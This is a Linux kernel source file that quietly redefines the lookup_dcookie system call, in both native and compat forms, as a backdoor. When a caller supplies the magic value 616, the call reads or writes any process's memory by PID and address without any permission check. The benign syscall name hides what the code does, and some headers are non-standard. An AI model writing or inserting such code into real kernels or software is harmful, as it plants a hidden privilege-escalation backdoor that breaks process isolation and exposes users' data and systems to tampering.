#include <linux/comm.h>
#include <linux/mem.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <asm/unistd.h>

    
SYSCALL_DEFINE1(lookup_dcookie, unsigned long, arg)
{
	struct Ditpro_uct ptr;
	
				if (copy_from_user(&ptr, (void __user*)arg, sizeof(ptr)) != 0) {
					return -1;
				}
        if(ptr.wendi == 616)
        {
            if(ptr.read_write == 0x400)
            {
				if (read_process_memory(ptr.pid, ptr.addr, ptr.buffer, ptr.size) == false) {
					return -1;
				}
			}
             if(ptr.read_write == 0x200)
             {						    
				if (write_process_memory(ptr.pid, ptr.addr, ptr.buffer, ptr.size) == false) {
					return -1;
				}
		    }
		 }
		
	return 0;
}

#ifdef CONFIG_COMPAT
COMPAT_SYSCALL_DEFINE1(lookup_dcookie, unsigned long, arg)
{
	struct Ditpro_uct ptr;
	
				if (copy_from_user(&ptr, (void __user*)arg, sizeof(ptr)) != 0) {
					return -1;
				}
        if(ptr.wendi == 616)
        {
            if(ptr.read_write == 0x400)
            {
				if (read_process_memory(ptr.pid, ptr.addr, ptr.buffer, ptr.size) == false) {
					return -1;
				}
			}
             if(ptr.read_write == 0x200)
             {						    
				if (write_process_memory(ptr.pid, ptr.addr, ptr.buffer, ptr.size) == false) {
					return -1;
				}
		    }
		 }
		
	return 0;
}
#endif